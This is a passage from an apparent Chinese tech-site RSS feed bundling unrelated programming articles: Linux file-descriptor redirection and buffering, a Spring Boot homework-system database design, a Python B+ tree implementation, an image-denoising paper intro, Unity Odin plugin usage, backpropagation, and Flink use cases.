其实这也是C下实现多态的思路，虽然都是read函数，但是作用在不同的文件结构体中可以产生不同的效果。
4. IO的基本过程
我们知道 file 结构体用来描述文件，包括其属性集和操作方法表等，同时还由一个指向
文件内核缓冲区
的指针。
文件的IO过程都要通过这个缓冲区作为中间商，平衡磁盘和内存之间读写速度上的差异。
读就是将文件内容从磁盘加载到文件缓冲区，然后通过read函数将文件缓冲区的内容提取到某个数组或者变量中去。
写就是通过write函数先将变量或者数组中的内容存放到文件缓冲区中，之后OS自己决定何时将文件缓冲区中的内容刷新到磁盘中去。
这也是为什么我们在操作word文档的时候，如果突然文档进程挂掉了，我们没保存的东西可能就没了，因为我们写文档的时候只是把内容write到了文件缓冲区中，而文件缓冲区是在被进程管理着的，进程挂了缓冲区直接就被释放了，根本来不及把内容写到磁盘中去。
5. 深入理解重定向
首先我们了解一共简单的概念，进程打开文件需要给文件分配文件描述符fd，fd的分配原则是
分配最小的未被使用的fd
​​​​​​​        ​​​​​​​
​​​​​​​        ​​​​​​​
可以看到正常情况下，因为文件描述符 0、1、2 都被占用了，因此后续进程打开的文件，其描述符是从3开始递增的。
​​​​​​​        ​​​​​​​
​​​​​​​        ​​​​​​​
可以看到当我们把0号文件关闭之后，第一个我们自己打开的文件就从0号描述符开始排队了，这就是所谓分配最小的未被占用的文件描述符。
在继续谈重定向问题之前我们再明确一个问题，为什么 printf 就是直接把内容打印到显示器上，但是 fprintf 既可以选择stdout打印到显示器，也可以通过 FILE* 指针打印到某个文件中去。
道理很简单，因为printf函数中写死了写入的文件，就是 fd == 1 的文件也就是显示器文件，因此我们printf的内容就都被固定输出到 1 文件中去了。
由此我们获得灵感，如果 close(1) 此时 1 号文件(显示器)被关闭，但是 open log1.txt 的时候就会把这个文件的 fd 设置成 1 ，之后的printf又指认 1 号文件，也就是说这么做是不是就完成了printf的重定向
我们实践一下
​​​​​​​        ​​​​​​​
​​​​​​​        ​​​​​​​
当我们编译运行之后发现并没有在屏幕上打印fd的信息，这还算正常，因为现在 1 号位中的文件已经不是显示器，而是 log1.txt 了。但是当我们查看 log1.txt 的时候发现这个文件里也啥都没有，这一点就很奇怪了。
但是我们使用fflush函数刷新一下就可以看到该写入的东西就写入了，也就是完成了重定向的现象。
之所以会出现这种现象是因为我们选择的打印函数printf是C语言的函数，而语言级的IO函数也有一块配套的
用户级缓冲区
，其作用是暂时保存要写入的内容，之后等待时机写入文件的内核缓冲区，而进入文件内核缓冲区之后要写入的数据就被OS管理起来了，什么时候刷新到显示器上就是OS自己决定的了。
之所以有用户级缓冲区是因为使用系统调用函数的成本是很高的，至少比一般我们在语言层上写的那些的函数要高。因此不能频繁的调用系统调用将数据插入到文件内核缓冲区，于是就诞生了用户级缓冲区暂存数据。
用户级缓冲区刷新数据的机制：1.如果是显示器文件，遇到\n就刷新，这种机制也叫行刷新。  2. 普通文件，将用户级缓冲区填满再刷新  3. 不缓冲，直接使用系统调用将数据存入文件的内核缓冲区。
因此之所以会出现我们刚才那种现象，是因为使用printf函数的时候，先是将数据暂存到了用户级缓冲区，到合适的时候会调用write接口刷新到文件内核缓冲区。但是因为我们要写入的内容实在太少了，没有触发写入文件内核缓冲区的机制，但是printf完之后我们就使用系统调用close将文件关闭了，此时用户级缓冲区的内容根本来不急将内容刷新到文件内核缓冲区了。
当然，如果我们使用C语言提供的fclose函数，在关闭的文件的时候会自动刷新一下用户级缓冲区，或者使用fflush向上面的例子一样在调用系统调用之前手动刷新一下用户级缓冲区。
fsync
将文件内核缓冲区的内容直接刷新到外设文件中。
因此重定向的过程实际上就是对文件描述符指向的替换，递增的文件描述符指向变化了，但是上层不知道因此使用相同的文件描述符时操作的文件却不同
​​​​​​​        ​​​​​​​
这里还有一个后面有用的小细节，就是当描述符指向替换过后原指向还是有效的，也就是说一个文件是可以同时被多个指针指向的，这个东西后面进程间通讯是有用的。
5.1 dup2 文件重定向
前面那种手动重定向的方案还是太麻烦了，系统调用中提供了重定向函数man dup2直接查看
​​​​​​​
这个函数就是将oldfd指向的文件重定向到newfd的位置。
​​​​​​​
​​​​​​​
dup2重定向之后
​​​​​​​
​​​​​​​
看这里打印的fd值也可以印证我们前面说的一共文件被两个指针同时指向，之前是3号指针指向log.txt文件，但是我们dup2重定向了之后1号指针也指向了这个文件，但是3号指针的指向并没有被抹除。
最后我们明确两点，第一重定向应该让子进程自己做，第二程序替换不会影响重定向，因为它们在进程PCB中属不同的模块，互不影响。
5.2 fsync 刷新文件内核缓冲区
我们知道fflush函数可以将用户级缓冲区的内容手动刷新到文件内核级缓冲区中。同理
系统调用 fsync 函数
可以将文件内核级缓冲区的内容刷新到文件中去。
参数很简单，就是文件描述符fd</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540121.html</guid><pubDate>Fri, 31 Oct 2025 07:24:56 +0000</pubDate></item><item><title>互动式教育技术：Spring Boot师生共评作业管理系统</title><link>https://www.ppmy.cn/news/1540122.html</link><description>3系统分析
3.1可行性分析
通过对本师生共评的作业管理系统实行的目的初步调查和分析，提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。
3.1.1技术可行性
本师生共评的作业管理系统采用JAVA作为开发语言，Spring Boot框架，是基于WEB平台的B/S架构系统。
（1）Java提供了稳定的性能、优秀的升级性、更快速的开发、更简便的管理、全新的语言以及服务。整个系统帮用户做了大部分不重要的琐碎的工作。
（2）基于B/S模式的系统的开发已发展日趋成熟。
（3）众所周知，Java是面向对象的开发语言。程序开发员可以在Eclipse平台上面方便的使用一些已知的解决方案。
因此，师生共评的作业管理系统在开发技术上具有很高可行性，且开发人员掌握了一定的开发技术，所以此系统的开发技术具有可行性。
3.1.2经济可行性
本师生共评的作业管理系统采用的软件都是开源的，这样能够削减很多的精力和资源，降低开发成本。同时对计算机的配置要求也极低，即使是淘汰下来的计算机也能够满足需要，因此，本系统在经济上是完全具有可行性的，所以在经济上是十分可行的。
3.1.3操作可行性
本师生共评的作业管理系统的界面简单易操作，用户只要平时有在用过电脑，都能进行访问和操作。本系统具有易操作、易管理、交互性好的特点，在操作上是非常简单的，因此在操作上具有很高的可行性。
综上所述，此系统开发目标已明确，在技术、经济和操作方面都具有很高的可行性，并且投入少、功能完善、管理方便，因此系统的开发是完全可行的。
3.2系统性能分析
3.2.1 系统安全性
此师生共评的作业管理系统要严格控制管理权限，具体要求如下：
（1）要想对师生共评的作业管理系统进行管理，首先要依靠用户名和密码在系统中登陆，无权限的用户不可以通过任何方式登录系统和对系统的任何信息和数据进行查看，这样可以保证系统的安全可靠性和准确性。
（2）在具体实现中对不同的权限进行设定，不同权限的用户在系统中登陆后，不可以越级操作。
3.2.2 数据完整性
（1）所有记录信息要保持全面，信息记录内容不可以是空。
（2）各种数据间相互联系要保持正确。
（3）相同数据在不同记录中要保持一致。
3.3系统界面分析
目前，界面设计已经成为对软件质量进行评价的一条关键指标，一个好的用户界面可以使用户使用系统的信心和兴趣增加，从而使工作效率提高，JSP技术是将JAVA语言作为脚本语言的，JSP网页给整个服务器端的JAVA库单元提供了一个接口用来服务HTTP的应用程序。创建动态页面比较方便。客户界面是指软件系统与用户交互的接口，往往涵盖输出、输入、人机对话的界面格式等。
1.输出设计
输出是由电脑对输入的基本信息进行解决，生成高质量的有效信息，并使之具有一定的格式，提供给管理者使用，这是输出设计的主要责任和目标。
系统开发的过程与实施过程相反，并不是从输入设计到输出设计，而是从输出设计到输入设计。这是由于输出表格与使用者直接相联系，设计的目的应当是确保使用者可以很方便的使用输出表格，并且可以将各部门的有用信息及时的反映出来。输出设计的准绳是既要整体琢磨不同管理层的所有需要，又要简洁，不要提供给用户不需要的信息。
2.输入设计
输入数据的收集和录入是比较麻烦的，需要非常多的人力和一定设备，而且经常出错。一旦输入系统的数据不正确，那么处理后的输出就会扩大这些错误，因此输入的数据的准确性对整个系统的性能起着决定性意义。
输入设计有以下几点原则：
1）输入量应尽量保持在能够满足处理要求的最低限度。输入量越少，错误率就会越少，数据的准备时间也越少。
2）应尽可能的使输入的准备以及输入的过程进行时比较方便，这样使错误的发生率降低。
3）应尽量早检查输入数据（尽量接近原数据发生点）,以便使错误更正比较及时。
4）输入数据尽早地记录成其处理所需的形式，以防止数据由一种介质转移到另一种介质时需要转录而可能发生的错误。
3.4系统流程和逻辑
图3-3登录流程图
图3-4修改密码流程图
4系统概要设计
4.1概述
本系统采用B/S结构(Browser/Server,浏览器/服务器结构)和基于Web服务两种模式，是一个适用于Internet环境下的模型结构。只要用户能连上Internet,便可以在任何时间、任何地点使用。系统工作原理图如图4-1所示：
图4-1系统工作原理图
4.2系统结构
本系统是基于B/S架构的网站系统，设计的教师功能结构图如下图所示：
图4-2教师功能结构图
本系统是基于B/S架构的网站系统，设计的用户功能结构图如下图所示：
图4-3 用户功能结构图
4.3.数据库设计
4.3.1数据库实体
概念设计的目标是设计出反映某个组织部门信息需求的数据库系统概念模式，数据库系统的概念模式独立于数据库系统的逻辑结构、独立于数据库管理系统（DBMS）、独立于计算机系统。
概念模式的设计方法是在需求分析的基础上，用概念数据模型（例如E-R模型）表示数据及数据之间的相互联系，设计出反映用户信息需求和处理需求的数据库系统概念模式。概念设计的目标是准确描述应用领域的信息模式，支持用户的各种应用，这样既容易转换为数据库系统逻辑模式，又容易为用户理解。数据库系统概念模式是面向现实世界的数据模型，不能直接用于数据库系统的实现。在此阶段，用户可以参与和评价数据库系统的设计，从而有利于保证数据库系统的设计与用户的需求相吻合。在概念模式的设计中，E-R模型法是最常见的设计方法。本系统的E-R图如下图所示：
（1）教师信息的实体属性图如下：
图4.12 教师信息实体属性图
（2）课程实体属性图如图4.13所示：
图4.13 课程实体属性图
（3）管理员实体属性图如图4.14所示：
图4.14 管理员实体属性图
4.3.2数据库设计表
师生共评的作业管理系统需要后台数据库，下面介绍数据库中的各个表的详细信息：
表4.1 教师信息表
字段 类型 空 默认 注释
id (主键) bigint(20) 否 主键
addtime timestamp 否 CURRENT_TIMESTAMP 创建时间
gonghao varchar(200) 否 工号
mima varchar(200) 否 密码
jiaoshixingming varchar(200) 否 教师姓名
xingbie varchar(200) 是 NULL 性别
zhicheng varchar(200) 是 NULL 职称
dianhua varchar(200) 是 NULL 电话
youxiang varchar(200) 是 NULL 邮箱
zhaopian varchar(200) 是 NULL 照片
表4.2 课程信息表
字段 类型 空 默认 注释
id (主键) bigint(20) 否 主键
addtime timestamp 否 CURRENT_TIMESTAMP 创建时间
kechengbianhao varchar(200) 是 NULL 课程编号
kechengmingcheng varchar(200) 是 NULL 课程名称
keshi varchar(200) 是 NULL 课时
xuefen int(11) 是 NULL 学分
jiaoxuewenjian varchar(200) 是 NULL 教学文件
shangkedidian varchar(200) 是 NULL 上课地点
kechengxiangqing longtext 是 NULL 课程详情
tupian varchar(200) 是 NULL 图片
表4.3 管理员信息表
字段 类型 空 默认 注释
id (主键) bigint(20) 否 主键
username varchar(100) 否 用户名
password varchar(100) 否 密码
role varchar(100) 是 管理员 角色
addtime timestamp 否 CURRENT_TIMESTAMP 新增时间
表4.4 小组信息表
字段 类型 空 默认 注释
id (主键) bigint(20) 否 主键
addtime timestamp 否 CURRENT_TIMESTAMP 创建时间
xiaozubianhao varchar(200) 是 NULL 小组编号
xiaozumingcheng varchar(200) 是 NULL 小组名称
zuzhangxuehao varchar(200) 是 NULL 组长学号
zuzhangxingming varchar(200) 是 NULL 组长姓名
xiaozurenshu int(11) 是 NULL 小组人数
xiaozuzhineng longtext 是 NULL 小组职能
xuehao varchar(200) 是 NULL 学号
xingming varchar(200) 是 NULL 姓名
表4.5 学生信息表
字段 类型 空 默认 注释
id (主键) bigint(20) 否 主键
addtime timestamp 否 CURRENT_TIMESTAMP 创建时间
xuehao varchar(200) 否 学号
mima varchar(200) 否 密码
xueshengxingming varchar(200) 否 学生姓名
xingbie varchar(200) 是 NULL 性别
nianling int(11) 是 NULL 年龄
zhuanye varchar(200) 是 NULL 专业
dianhua varchar(200) 是 NULL 电话
youxiang varchar(200) 是 NULL 邮箱
shenfenzheng varchar(200) 是 NULL 身份证
zhaopian varchar(200) 是 NULL 照片
表4.6 作业信息表
字段 类型 空 默认 注释
id (主键) bigint(20) 否 主键
addtime timestamp 否 CURRENT_TIMESTAMP 创建时间
gonghao varchar(200) 是 NULL 工号
jiaoshixingming varchar(200) 是 NULL 教师姓名
faburiqi date 是 NULL 发布日期
jiezhiriqi date 是 NULL 截止日期
zuoyebiaoti varchar(200) 是 NULL 作业标题
zuoyeneirong longtext 是 NULL 作业内容
tupian varchar(200) 是 NULL 图片
userid bigint(20) 是 NULL 用户id
表4.7 作业互评信息表
字段 类型 空 默认 注释
id (主键) bigint(20) 否 主键
addtime timestamp 否 CURRENT_TIMESTAMP 创建时间
zuoyebianhao varchar(200) 是 NULL 作业编号
timu varchar(200) 是 NULL 题目
zu varchar(200) 是 NULL 组
neirong varchar(200) 是 NULL 内容
jiaoshi varchar(200) 是 NULL 教师
zuoyezhaopian varchar(200) 是 NULL 作业照片
gonghao varchar(200) 是 NULL 工号
jiaoshixingming varchar(200) 是 NULL 教师姓名
zuoyefujian varchar(200) 是 NULL 作业附件
fujianming varchar(200) 是 NULL 附件名
fujianbianhao varchar(200) 是 NULL 附件编号
shangchuanshijian datetime 是 NULL 上传时间
xuehao varchar(200) 是 NULL 学号
xueshengxingming varchar(200) 是 NULL 学生姓名
hupingjifen varchar(200) 是 NULL 互评给分
表4.8 作业评分信息表
字段 类型 空 默认 注释
id (主键) bigint(20) 否 主键
addtime timestamp 否 CURRENT_TIMESTAMP 创建时间
zuoyemingcheng varchar(200) 是 NULL 作业名称
kechengmingcheng varchar(200) 是 NULL 课程名称
zuoyetupian varchar(200) 是 NULL 作业图片
xuehao varchar(200) 是 NULL 学号
xueshengxingming varchar(200) 是 NULL 学生姓名
zuoyepingfen int(11) 否 作业评分
zuoyepingyu longtext 是 NULL 作业评语
表4.9 作业提交信息表
字段 类型 空 默认 注释
id (主键) bigint(20) 否 主键
addtime timestamp 否 CURRENT_TIMESTAMP 创建时间
zuoyebianhao varchar(200) 是 NULL 作业编号
timu varchar(200) 是 NULL 题目
zu varchar(200) 是 NULL 组
neirong varchar(200) 是 NULL 内容
jiaoshi varchar(200) 是 NULL 教师
zuoyezhaopian varchar(200) 是 NULL 作业照片
gonghao varchar(200) 是 NULL 工号
jiaoshixingming varchar(200) 是 NULL 教师姓名
zuoyefujian varchar(200) 是 NULL 作业附件
fujianming varchar(200) 是 NULL 附件名
fujianbianhao varchar(200) 是 NULL 附件编号
shangchuanshijian datetime 是 NULL 上传时间
xuehao varchar(200) 是 NULL 学号
xueshengxingming varchar(200) 是 NULL 学生姓名
hupingjifen varchar(200) 是 NULL 互评给分
表4.10 组长信息表
字段 类型 空 默认 注释
id (主键) bigint(20) 否 主键
addtime timestamp 否 CURRENT_TIMESTAMP 创建时间
zuzhangxuehao varchar(200) 否 组长学号
mima varchar(200) 否 密码
zuzhangxingming varchar(200) 是 NULL 组长姓名
zuzhangzhaopian varchar(200) 是 NULL 组长照片
suozaixiaozu varchar(200) 是 NULL 所在小组
xingbie varchar(200) 是 NULL 性别
lianxidianhua varchar(200) 是 NULL 联系电话
sfsh varchar(200) 是 否 是否审核
shhf longtext 是 NULL 审核回复</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540122.html</guid><pubDate>Fri, 31 Oct 2025 07:24:58 +0000</pubDate></item><item><title>数据结构编程实践20讲(Python版)—10B+树</title><link>https://www.ppmy.cn/news/1540123.html</link><description>本文目录
10 B+树(B+ Tree)
S1 说明
S2 B+树和B树的区别
S3 示例
S4 B+树的应用Python代码
应用1：数据库索引
应用2：文件系统的目录管理
应用3：有序键值存储
往期链接
01 数组
02 链表
03 栈
04 队列
05 二叉树
06 二叉搜索树
07 AVL树
08 红黑树
09 B树
10 B+树(B+ Tree)
S1 说明
1. 数据结构
B+树是一种自平衡的树数据结构，主要用于数据库和文件系统中，具有以下特征：
节点结构：
内部节点：仅存储键，用于指引搜索。
叶子节点：存储实际的数据记录，并通过指针顺序链接，形成链表。
高度平衡：所有叶子节点在同一层，确保访问时间一致。
度：每个节点可以有多个子节点，具体数量取决于树的度数（最小度数 t）。
2. 特点
高效的查找：由于数据仅存储在叶子节点，查找操作通常更快。
范围查询：叶子节点的链表结构使得范围查询非常高效。
动态调整：插入和删除操作可以动态调整树的形状，保持平衡。
空间利用率高：内部节点仅存储键，可以提高存储效率。
3. 应用领域
数据库系统：用于索引数据库中的数据，以提高查询效率。
文件系统：用于管理文件和目录的存储，支持快速访问和检索。
内存数据库：在内存中高效存储数据，以提供快速访问。
S2 B+树和B树的区别
B+树和B树是两种广泛使用的自平衡搜索树，虽然它们在结构和功能上有许多相似之处，但也有一些关键的区别：
1. 节点结构
B树：每个节点可以存储多个键值对和指向子节点的指针。每个节点中的键可以用于查找、插入和删除。
B+树：内部节点仅存储键，而不存储实际的数据。所有数据都存储在叶子节点中。内部节点的主要作用是引导搜索。
2. 叶子节点
B树：叶子节点不一定形成一个链表，数据散布在各个节点中。
B+树：所有叶子节点通过指针相连，形成一个链表。这使得范围查询更高效，因为可以顺序访问所有叶子节点。
3. 搜索效率
B树：搜索时可能需要在多个节点中查找数据。
B+树：由于所有数据在叶子节点中，搜索时可以直接找到叶子节点，避免了在内部节点中查找数据的复杂性。
4. 插入和删除
B树：每次插入或删除可能会影响多个节点的结构。
B+树：插入和删除操作主要影响叶子节点，内部节点的结构相对稳定。
5. 空间利用率
B树：由于每个节点存储键值对，可能会存在空间浪费。
B+树：内部节点只存储键，通常能更高效地利用空间。
6. 应用场景
B树：适用于对数据的随机访问和修改频繁的场景。
B+树：常用于数据库和文件系统，尤其在需要进行范围查询和顺序访问时表现更好。
总结来说，B+树在范围查询和顺序访问方面比B树更高效，而B树在随机访问和修改时具有更好的灵活性。
S3 示例
from
graphviz
import
Digraph
class
BPlusTreeNode
:
def
__init__
(
self
,
order
,
is_leaf
=
False
)
:
self
.
order
=
order
# B+ 树的阶数
self
.
is_leaf
=
is_leaf
# 是否为叶子节点
self
.
keys
=
[
]
# 键值列表
self
.
children
=
[
]
# 子节点指针或数据指针
self
.
next
=
None
# 叶子节点的下一个叶子节点
class
BPlusTree
:
def
__init__
(
self
,
order
=
5
)
:
self
.
root
=
BPlusTreeNode
(
order
,
True
)
self
.
order
=
order
def
insert
(
self
,
key
)
:
"""向 B+ 树中插入一个键值"""
node
=
self
.
rootparents
=
[
]
# 找到叶子节点
while
not
node
.
is_leaf
:
parents
.
append
(
node
)
index
=
self
.
_find_index
(
node
.
keys
,
key
)
node
=
node
.
children
[
index
]
# 插入键值到叶子节点
self
.
_insert_into_leaf
(
node
,
key
)
# 检查是否需要分裂
while
len
(
node
.
keys
)
&gt;
self
.
order
-
1
:
if
node
==
self
.
root
:
# 根节点分裂
new_node
,
mid_key
=
self
.
_split_node
(
node
)
new_root
=
BPlusTreeNode
(
self
.
order
)
new_root
.
keys
=
[
mid_key
]
new_root
.
children
=
[
node
,
new_node
]
self
.
root
=
new_root
break
else
:
parent
=
parents
.
pop
(
)
new_node
,
mid_key
=
self
.
_split_node
(
node
)
index
=
self
.
_find_index
(
parent
.
keys
,
mid_key
)
parent
.
keys
.
insert
(
index
,
mid_key
)
parent
.
children
.
insert
(
index
+
1
,
new_node
)
node
=
parent
def
_split_node
(
self
,
node
)
:
"""分裂节点，返回新节点和提升的键值"""
mid_index
=
(
self
.
order
-
1
)
//
2
mid_key
=
node
.
keys
[
mid_index
]
# 创建新节点
new_node
=
BPlusTreeNode
(
self
.
order
,
node
.
is_leaf
)
new_node
.
keys
=
node
.
keys
[
mid_index
+
(
0
if
node
.
is_leaf
else
1
)
:
]
new_node
.
children
=
node
.
children
[
mid_index
+
1
:
]
# 更新当前节点
node
.
keys
=
node
.
keys
[
:
mid_index
+
(
1
if
node
.
is_leaf
else
0
)
]
node
.
children
=
node
.
children
[
:
mid_index
+
1
]
if
node
.
is_leaf
:
# 更新叶子节点的 next 指针
new_node
.
next
=
node
.
next
node
.
next
=
new_node
return
new_node
,
mid_key
def
_insert_into_leaf
(
self
,
leaf
,
key
)
:
"""将键值插入到叶子节点中"""
index
=
self
.
_find_index
(
leaf
.
keys
,
key
)
leaf
.
keys
.
insert
(
index
,
key
)
leaf
.
children
.
insert
(
index
,
key
)
# 叶子节点的 children 存储数据，这里简化为与键值相同
def
_find_index
(
self
,
keys
,
key
)
:
"""找到应插入的位置"""
for
i
,
item
in
enumerate
(
keys
)
:
if
key
&lt;
item
:
return
i
return
len
(
keys
)
def
search
(
self
,
key
)
:
"""在 B+ 树中搜索键值"""
node
=
self
.
root
while
not
node
.
is_leaf
:
index
=
self
.
_find_index
(
node
.
keys
,
key
)
node
=
node
.
children
[
index
]
for
i
,
item
in
enumerate
(
node
.
keys
)
:
if
item
==
key
:
return
node
.
children
[
i
]
return
None
def
display
(
self
,
node
=
None
,
level
=
0
)
:
"""显示 B+ 树结构"""
node
=
node
or
self
.
root
if
node
.
is_leaf
:
print</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540123.html</guid><pubDate>Fri, 31 Oct 2025 07:24:59 +0000</pubDate></item><item><title>【图像去噪】论文精读：KBNet: Kernel Basis Network for Image Restoration</title><link>https://www.ppmy.cn/news/1540124.html</link><description>请先看【专栏介绍文章】：【图像去噪（Image Denoising）】关于【图像去噪】专栏的相关说明，包含适配人群、专栏简介、专栏亮点、阅读方法、定价理由、品质承诺、关于更新、去噪概述、文章目录、资料汇总、问题汇总（更新中）
文章目录
前言
Abstract
1 Introduction
2 Related Work
2.1 Traditional Methods
2.2 CNNs for Image Restoration
2.3 Transformers for Image Restoration
3 Method
3.1 Kernel Basis Attention Module
3.2 Multi-axis Feature Fusion Block
3.3 Intergration of MFF Block into U-Net
4 Results
4.1 Implementation Details
4.2 Gaussian Denoising Results
4.3 Raw Image Denoising Results
4.4 Deraining and Defocus results
4.5 Ablation Studies
5 Conclusion
前言
论文题目：KBNet: Kernel Basis Network for Image Restoration —— KBNet:图像恢复的核基础网络
论文地址：KBNet: Kernel Basis Network for Image Restoration
论文源码：https://github.com/zhangyi-3/kbnet
基于kernel的图像恢复网络KBNet！SIDD数据集上PSNR/SSIM：40.35/0.972！
Abstract
如何聚合空</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540124.html</guid><pubDate>Fri, 31 Oct 2025 07:25:03 +0000</pubDate></item><item><title>Odin插件基本使用</title><link>https://www.ppmy.cn/news/1540125.html</link><description>介绍
Odin Inspector是Unity的一个插件，让您可以享受拥有强大，自定义和用户友好编辑器的所有工作流程优势，而无需编写任何自定义编辑器代码。
安装
需要有对应的unity包或者去官网或者资源商店下载
官方网址
Odin Inspector and Serializer | Improve your workflow in Unity
用处
有着许多能力强大的特性
案例与基本使用方法
using Sirenix.OdinInspector;
using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;[CreateAssetMenu(fileName ="GameConfig",menuName ="Config")]
public class Config : SerializedScriptableObject
{[LabelText("姓名")]public string name;[LabelText("路径")]public string path;[LabelText("坐标")][MinMaxSlider(0, 2)]public Vector2 vector2;[LabelText("数字")][Range(1,3)]public int num;[SerializeField][DictionaryDrawerSettings(KeyLabel ="ID",ValueLabel ="值")]private Dictionary&lt;int, Data&gt; dic;[Button("初始化",ButtonHeight =40)][GUIColor(0,1,0)]void Init(){Debug.Log("Init");dic[1].dataID = "3";}
}[Serializable]
public class Data
{[LabelText("数据ID")]public string dataID;[LabelText("数据Key")][Range(1,300)]public int dataKey;
}
解释与注意事项
需要继承SerializedScriptableObject才能在面板上显示字典容器
对应展示</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540125.html</guid><pubDate>Fri, 31 Oct 2025 07:25:06 +0000</pubDate></item><item><title>反向传播算法（Backpropagation）</title><link>https://www.ppmy.cn/news/1540126.html</link><description>1. 引言
反向传播算法（Backpropagation）是机器学习和深度学习中用于训练神经网络的主要算法之一。它的核心思想是通过计算损失函数关于网络参数的梯度，然后利用这些梯度来更新网络的权重和偏置，以此来最小化损失函数。本文将详细介绍反向传播算法的原理，包括其基本概念、数学基础、实现步骤以及在深度学习中的应用。
2. 神经网络基础
在深入探讨反向传播算法之前，我们需要了解一些神经网络的基本概念。
2.1 神经元模型
神经网络的基本单元是神经元（或称为节点）。每个神经元接收一组输入信号，通过加权求和后加上一个偏置（bias），然后通过一个非线性激活函数进行处理，输出一个信号。这个过程可以用以下公式表示：
[ a = f\left(\sum_{i=1}^{n} w_i x_i + b\right) ]
其中，( a ) 是神经元的输出，( f ) 是激活函数，( w_i ) 是权重，( x_i ) 是输入，( b ) 是偏置，( n ) 是输入的数量。
2.2 多层感知器
多层感知器（MLP）是由多个神经元层组成的网络，包括输入层、隐藏层和输出层。每个神经元的输出可以作为下一层神经元的输入。通过这种方式，网络可以学习输入数据的复杂映射关系。
2.3 损失函数
损失函数（或代价函数）是衡量神经网络预测值与真实值之间差异的函数。常见的损失函数包括均方误差（MSE）和交叉熵损失。损失函数的选择取决于特定的应用场景。
3. 反向传播算法的数学基础
反向传播算法的核心是利用链式法则来计算损失函数关于网络参数的梯度。
3.1 链式法则
链式法则是微积分中的一个基本定理，它允许我们计算复合函数的导数。在神经网络中，链式法则被用来计算损失函数关于每个参数的梯度。
3.2 梯度计算
对于一个具有多个参数的函数，其梯度是一个向量，包含了函数关于每个参数的偏导数。在神经网络中，我们需要计算损失函数关于每个权重和偏置的梯度。
3.3 权重更新
一旦我们计算出梯度，就可以使用梯度下降法来更新网络的权重和偏置。权重更新的公式如下：
[ w_{new} = w_{old} - \eta \frac{\partial L}{\partial w} ]
其中，( w_{new} ) 是更新后的权重，( w_{old} ) 是旧的权重，( \eta ) 是学习率，( \frac{\partial L}{\partial w} ) 是损失函数关于权重的梯度。
4. 反向传播算法的实现步骤
反向传播算法的实现可以分为以下几个步骤：
4.1 前向传播
首先，我们需要进行前向传播，即从输入层到输出层计算每个神经元的输出值。这个过程涉及到权重的应用和激活函数的计算。
4.2 计算损失
接下来，我们计算输出层的预测值与真实值之间的损失。这一步通常涉及到损失函数的应用。
4.3 反向传播
反向传播是算法的核心步骤。我们从输出层开始，逐层计算损失函数关于每个参数的梯度。这个过程涉及到链式法则的应用。
4.4 权重更新
最后，我们使用计算出的梯度来更新网络的权重和偏置。这一步涉及到梯度下降法的应用。
5. 反向传播算法的优化
在实际应用中，为了提高反向传播算法的效率和效果，我们通常会采用一些优化技术。
5.1 动量（Momentum）
动量是一种加速梯度下降的方法，它通过考虑之前梯度的方向和大小来更新权重，从而加快收敛速度并减少震荡。
5.2 学习率衰减
学习率衰减是一种调整学习率的技术，它随着训练的进行逐渐减小学习率，以此来提高训练的稳定性和效果。
5.3 正则化
正则化是一种防止过拟合的技术，它通过在损失函数中添加一个惩罚项来限制模型的复杂度。
5.4 二阶优化方法
除了一阶优化方法（如梯度下降），还可以使用二阶优化方法（如牛顿法），这些方法利用了损失函数的二阶导数信息，从而可能更快地收敛。
6. 反向传播算法在深度学习中的应用
反向传播算法是深度学习中不可或缺的一部分，它被广泛应用于各种深度学习模型的训练中。
6.1 卷积神经网络（CNN）
在卷积神经网络中，反向传播算法被用来训练网络的卷积层、池化层和全连接层，以此来处理图像数据。
6.2 循环神经网络（RNN）
在循环神经网络中，反向传播算法被用来训练网络的隐藏层，以此来处理序列数据。
6.3 生成对抗网络（GAN）
在生成对抗网络中，反向传播算法被用来同时训练生成器和判别器，以此来生成新的数据样本。
6.4 自然语言处理（NLP）
在自然语言处理中，反向传播算法被用来训练各种模型，如词嵌入、循环神经网络和注意力机制，以此来处理文本数据。
7. 结论
反向传播算法是深度学习中的核心算法，它通过计算损失函数关于网络参数的梯度来更新权重和偏置，以此来最小化损失函数。通过理解反向传播算法的原理和实现步骤，我们可以更好地设计和训练深度学习模型。同时，采用各种优化技术可以进一步提高算法的效率和效果。随着深度学习技术的不断发展，反向传播算法将继续在各种应用中发挥重要作用。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540126.html</guid><pubDate>Fri, 31 Oct 2025 07:25:08 +0000</pubDate></item><item><title>实时计算Flink应用场景</title><link>https://www.ppmy.cn/news/1540127.html</link><description>实时计算Flink应用场景
Flink是一个开源的流处理和批处理框架，具有低延迟、高吞吐、容错性强等特点，适用于大规模的实时数据处理和分析。它能够处理包括事件流、日志、传感器数据等各种类型的数据，因此在多个行业和领域有着广泛的应用。以下将详细介绍Flink在实时计算中的几个典型应用场景。
一、实时数据分析
实时数据分析是Flink的一个主要应用场景。在这个场景中，Flink可以处理实时流数据，并进行实时计算和分析。由于Flink具有低延迟、高吞吐的特点，它能够在数据到达时立即进行处理和分析，从而提供实时的洞察和决策支持。
实时监控
实时监控是实时数据分析的一个重要应用。在企业运营中，需要对各种业务指标进行实时监控，以确保业务的正常运行和及时发现潜在问题。例如，在电商平台上，可以实时监控商品的销售情况、用户的访问量、服务器的负载等指标，以便及时发现异常并进行处理。Flink可以实时读取数据流，对这些指标进行计算和分析，并将结果实时推送给相关人员，帮助他们做出及时的决策。
实时报警
实时报警是另一个重要的实时数据分析应用。在某些情况下，当业务指标超过预设的阈值时，需要立即触发报警机制，以便相关人员能够迅速采取措施。例如，在金融领域，当股票的交易价格出现异常波动时，需要立即触发报警并采取相应的风险控制措施。Flink可以根据预设的规则和条件，实时判断是否需要触发报警，并将报警信息推送给相关人员。
实时指标计算
实时指标计算是实时数据分析的基础。通过实时计算各种业务指标，可以为企业提供实时的业务洞察和决策支持。例如，在社交媒体平台上，可以实时计算用户的活跃度、留存率、转化率等指标，以便评估产品的性能和效果。Flink可以实时读取数据流，对这些指标进行计算和分析，并将结果存储在数据库中，供后续分析和使用。
二、金融行业应用
